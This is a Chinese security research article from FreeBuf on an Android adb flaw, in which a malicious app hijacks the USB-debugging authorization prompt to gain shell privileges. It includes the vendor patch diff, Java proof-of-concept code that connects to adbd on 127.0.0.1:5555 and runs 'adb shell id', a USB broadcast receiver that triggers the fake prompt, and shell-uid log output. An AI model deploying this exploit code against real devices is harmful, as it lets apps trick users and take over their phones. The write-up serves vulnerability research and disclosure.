@@ -1,0 +1,56 @@
+*本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。
+*本文原创作者：Tasfa，本文属FreeBuf原创奖励计划，未经许可禁止转载
+0x01 背景
+adb由于拥有shell权限，因此仅在授权PC端后才可使用shell权限，而通过该漏洞，可以实现在移动端获取shell权限，以致于可随意删除应用、屏幕截图等等高权限操作。不过移动端恶意应用程序必须能够连接到adbd正在监听的TCP端口，这就需要应用程序在它的AndroidMainifest.xml中定义INTERNET权限。
+而漏洞作者所用的攻击方法是构造一个覆盖窗口，劫持用户点击，也就是经典的hijack攻击。Google也据此修复了此种攻击方式。
+但是，我经过尝试后发现，除了以上构造hijack攻击窗口外，还可以劫持USB广播，然后在用户进行正常的连接电脑操作时，劫持授权界面，使用户误导从而进行授权。也即造成新的劫持授权漏洞方案。
+影响：
+0x02 原理分析
+为了能利用此adb配置漏洞，首先需要adb connect到adbd正在监听的端口，然后移动端会发起授权验证窗口，用户授权，验证通过后，可使用adb shell命令执行shell权限操作。
+使用adb命令“adb tcpip port”来启用adbd以监听TCP端口
+adb tcpip 5555
+在启用了USB调试，且adbd正处于TCP端口监听的情况下，恶意应用程序可以利用自带的adb二进制文件连接adbd，或者可以实现adb server协议与adbd通信。如果adb server尚未被设备授权，则会触发认证请求并提示用户验证并接受RSA公钥(引用[2])。但此认证框可被覆盖(Google已经修复)，具体可见参考文章。
+分析下diff：
+diff --git a/packages/SystemUI/src/com/android/systemui/usb/UsbDebuggingActivity.java b/packages/SystemUI/src/com/android/systemui/usb/UsbDebuggingActivity.java index f5447a2..329dd99 100644 --- a/packages/SystemUI/src/com/android/systemui/usb/UsbDebuggingActivity.java +++ b/packages/SystemUI/src/com/android/systemui/usb/UsbDebuggingActivity.java @@ -31,8 +31,12 @@ import android.os.SystemProperties; import android.util.Log; import android.view.LayoutInflater; +import android.view.MotionEvent; import android.view.View; +import android.view.Window; +import android.view.WindowManager; import android.widget.CheckBox; +import android.widget.Toast; import com.android.internal.app.AlertActivity; import com.android.internal.app.AlertController; @@ -48,6 +52,10 @@ @Override public void onCreate(Bundle icicle) { + Window window = getWindow(); + window.addPrivateFlags(WindowManager.LayoutParams.PRIVATE_FLAG_HIDE_NON_SYSTEM_OVERLAY_WINDOWS); + window.setType(WindowManager.LayoutParams.TYPE_SYSTEM_DIALOG); + super.onCreate(icicle); if (SystemProperties.getInt("service.adb.tcp.port", 0) == 0) { @@ -79,6 +87,23 @@ ap.mView = checkbox; setupAlert(); + + // adding touch listener on affirmative button - checks if window is obscured + // if obscured, do not let user give permissions (could be tapjacking involved) + //增加了对伪造窗口的认证判定，防止用户被误导授权 + final View.OnTouchListener filterTouchListener = (View v, MotionEvent event) -> { + // Filter obscured touches by consuming them. + if (((event.getFlags() & MotionEvent.FLAG_WINDOW_IS_OBSCURED) != 0) + || ((event.getFlags() & MotionEvent.FLAG_WINDOW_IS_PARTIALLY_OBSCURED) != 0)) { + if (event.getAction() == MotionEvent.ACTION_UP) { + Toast.makeText(v.getContext(), + R.string.touch_filtered_warning, + Toast.LENGTH_SHORT).show(); + } + return true; + } + return false; + }; + mAlert.getButton(BUTTON_POSITIVE).setOnTouchListener(filterTouchListener); }
+问题:
+1. 貌似只是对伪造窗口进行了防御，可漏洞难道不是因为TCP端口监听而造成提权吗？ 2. 那也就是用户授权后，依旧可以在移动端获取shell权限？
+结论:
+确实可以在移动端获取到shell权限
+思考
+那如果假设能监听用户是否连接USB，在用户进行正常的USB连接PC操作时，劫持授权窗口,即弹出我们的授权，也可以造成用户误导授权。
+结论:
+确实可以构造接收广播，当USB连接到PC时，会优先弹出我们的授权窗口，从而误导用户获得授权
+攻击思路:
+静态注册监听USB连接状态的广播，优先级设置为最高
+一旦监听到连接，启动后台service，执行连接命令
+此时会优先弹出我们的授权窗口，由于授权窗口并没有说明来自哪里的弹窗，见下图对比，仅仅是RSA指纹不同，即使是技术人员，也很难识别是来自哪里的授权窗口。
+PC端授权窗口
+apk恶意授权窗口
+0x03 漏洞利用
+试验环境: Android 4.4.4 Nexus 5
+PC端执行
+adb tcpip 5555
+作者攻击思路验证Poc:
+private void escalatePrivilege() { /* 如果大于android 6.0 需要使用预编译的adb可执行二进制文件 */ try { String[] connectCmd = {"adb","connect","127.0.0.1:5555"}; String[] idCmd = {"adb","shell","id"}; execCommand(connectCmd); execCommand(idCmd); } catch (Exception e) { Log.d(TAG, "escalatePrivilege: " + e.toString() ); } } private void readData(InputStream inputStream){ BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream)); String data ; while (true) { try { data = reader.readLine(); if(data == null) { break; } Log.d(TAG, "output: " + data); } catch (IOException e) { e.printStackTrace(); } } } private Process execCommand(String[] cmds){ ProcessBuilder builder = new ProcessBuilder(); Process execCommandProcess = null; builder.command(cmds); builder.directory(this.getFilesDir()); builder.redirectErrorStream(true); Map<String, String> env = builder.environment(); env.put("HOME", this.getFilesDir().toString()); env.put("TMPDIR", this.getFilesDir().toString()); try { execCommandProcess = builder.start(); execCommandProcess.waitFor(); readData(execCommandProcess.getInputStream()); }catch (InterruptedException e){ e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); } return execCommandProcess; }
+会弹出USB调试授权窗口，google已经修复此覆盖hijack漏洞。
+Logcat输出:
+output: connected to 127.0.0.1:5555 output: uid=2000(shell) gid=2000(shell) groups=1003(graphics),1004(input),1007(log),1009(mount),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats) context=u:r:shell:s0
+备注:
+可能在实验的时候，会没有弹出授权窗口，此时删除apk，撤销USB授权后，重启机器可还原环境。
+0x04 思考部分攻击思路Exp
+AndroidManifest.xml 增加USB广播:
+<receiver android:name=".UsbBroadcastReceiver" android:enabled="true" android:exported="true"> <intent-filter android:priority="100"> <action android:name="android.hardware.usb.action.USB_STATE"/> </intent-filter> </receiver>
+然后在接收广播后，启动service,在onStartCommand中进行连接:
+public int onStartCommand(Intent intent, int flags, int startId) { Log.d(TAG, "onStartCommand: adb vul"); String[] connectCmd = {"adb","connect","127.0.0.1:5555"}; execCommand(connectCmd); return super.onStartCommand(intent, flags, startId); }
+此时只要用户打开过该恶意应用，然后连接USB至电脑，则会弹出恶意的授权窗口:
+只有用户点击一律允许后，再次连接usb才会弹出pc端的授权，也因此造成了用户的诱导.
+0x05 防御与总结
+防御
+在进行试验的时候，漏洞利用阶段相对不稳定，有时候在连接的时候，并没有正常的弹窗，具体原因暂不明，后续有时间再研究。只要能正常弹出授权窗口，那么以上的攻击思路也即生效。
+尽量在正规应用商店下载应用，不要授权来历不明的PC，注意授权的指纹信息
+漏洞由于需要用户授权，也因此严重程度较低
+总结
+正向思考: 在用户进行正常授权后，可获得shell权限，也即可以在移动端实现静默安装、卸载等等功能。
+通过授权劫持攻击，恶意应用可以在用户不知情的情况下获取高权限，从而对系统造成破坏。
+0x06 参考
+*本文原创作者：Tasfa，本文属FreeBuf原创奖励计划，未经许可禁止转载
